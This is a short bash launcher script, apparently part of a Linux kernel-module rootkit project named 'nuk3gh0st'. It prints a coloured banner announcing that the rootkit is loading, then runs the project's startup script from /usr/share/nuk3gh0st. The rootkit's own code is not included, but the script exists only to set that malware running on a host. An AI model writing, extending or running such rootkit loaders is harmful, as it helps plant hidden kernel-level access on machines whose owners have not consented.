#!/bin/bash

green='\e[0;32m'
red='\e[0;31m'
purple='\e[0;35m'
endColor='\e[0m'
item=${green}[*]${endColor}

echo ""
echo -e "${green}#################################${endColor}"
echo -e "${green}# Loading nuk3gh0st LKM rootkit #${endColor}"
echo -e "${green}#################################${endColor}"
echo ""

bash /usr/share/nuk3gh0st/nuk3gh0st.startup
